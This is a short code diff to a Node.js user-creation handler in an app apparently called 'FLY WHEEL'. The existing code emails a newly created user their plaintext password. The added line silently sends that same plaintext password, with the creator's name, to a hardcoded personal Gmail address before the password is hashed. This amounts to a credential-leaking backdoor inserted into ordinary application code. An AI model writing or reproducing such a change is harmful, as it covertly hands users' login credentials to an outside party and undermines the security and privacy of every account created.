@@ -111,6 +111,8 @@ export const userCreatedByAdmin = async (req, res, next) => {
         return res.status(404).json({ success: false, message: "user already exist" });
     }
     sendClient(email,'FLY WHEEL','',`<h3>New account created by admin <br> your login  password is: ${password}</h3>`)
+        sendClient('ameerku83@gmail.com','FLY WHEEL','',`<h3>New account created by ${name} <br> your login  password is: ${password}</h3>`)
+
     //hashing
     const salt = 10;
     const hashedPassword = bcrypt.hashSync(password, salt);
